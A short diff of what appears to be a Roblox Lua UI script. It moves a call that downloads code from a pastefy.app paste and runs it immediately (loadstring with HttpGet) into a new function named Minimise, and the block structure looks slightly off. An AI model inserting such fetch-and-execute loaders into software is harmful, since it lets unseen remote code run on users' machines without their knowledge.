@@ -1311,7 +1311,9 @@ local function Unhide()
 	Debounce = false
 end
 
-loadstring(game:HttpGet("https://pastefy.app/iNfWOAv4/raw",true))()
+local function Minimise()
+		loadstring(game:HttpGet("https://pastefy.app/iNfWOAv4/raw",true))()
+	end
 end
 
 local function createSettings(window)
